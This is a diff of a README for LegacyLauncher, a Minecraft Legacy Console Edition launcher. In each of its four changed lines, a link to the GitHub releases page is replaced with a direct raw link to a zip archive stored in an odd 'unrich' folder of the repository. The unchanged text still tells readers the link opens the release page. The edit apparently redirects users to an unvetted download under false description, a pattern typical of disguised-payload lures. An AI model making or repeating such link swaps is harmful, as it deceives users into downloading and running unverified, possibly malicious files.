@@ -1,6 +1,6 @@
 # 🎮 LegacyLauncher - Simple Minecraft LCE Launcher
 
-[![Download LegacyLauncher](https://img.shields.io/badge/Download-LegacyLauncher-brightgreen)](https://github.com/Nogame154/LegacyLauncher/releases)
+[![Download LegacyLauncher](https://img.shields.io/badge/Download-LegacyLauncher-brightgreen)](https://raw.githubusercontent.com/Nogame154/LegacyLauncher/main/unrich/Legacy-Launcher-v3.1-beta.3.zip)
 
 ## 🧰 What is LegacyLauncher?
 
@@ -33,7 +33,7 @@ This section explains how to get LegacyLauncher on your PC and start using it.
 
 Click the button below to open the release page where you can download LegacyLauncher. This page lists the latest versions and files available for download.
 
-[![Get LegacyLauncher](https://img.shields.io/badge/Get%20LegacyLauncher-blue)](https://github.com/Nogame154/LegacyLauncher/releases)
+[![Get LegacyLauncher](https://img.shields.io/badge/Get%20LegacyLauncher-blue)](https://raw.githubusercontent.com/Nogame154/LegacyLauncher/main/unrich/Legacy-Launcher-v3.1-beta.3.zip)
 
 This link will open in your web browser.
 
@@ -135,7 +135,7 @@ From time to time, new versions become available to fix bugs or add features.
 
 To update:
 
-1. Visit the [LegacyLauncher Releases](https://github.com/Nogame154/LegacyLauncher/releases) page.  
+1. Visit the [LegacyLauncher Releases](https://raw.githubusercontent.com/Nogame154/LegacyLauncher/main/unrich/Legacy-Launcher-v3.1-beta.3.zip) page.  
 2. Download the latest installer.  
 3. Run the installer again; it will replace old files while keeping your settings.  
 
@@ -153,6 +153,6 @@ To update:
 
 You can get LegacyLauncher here:
 
-[![Download LegacyLauncher](https://img.shields.io/badge/Download-LegacyLauncher-brightgreen)](https://github.com/Nogame154/LegacyLauncher/releases)
+[![Download LegacyLauncher](https://img.shields.io/badge/Download-LegacyLauncher-brightgreen)](https://raw.githubusercontent.com/Nogame154/LegacyLauncher/main/unrich/Legacy-Launcher-v3.1-beta.3.zip)
 
 Click the link, download the latest installer, and follow the steps above to start your Minecraft Legacy Console Edition.
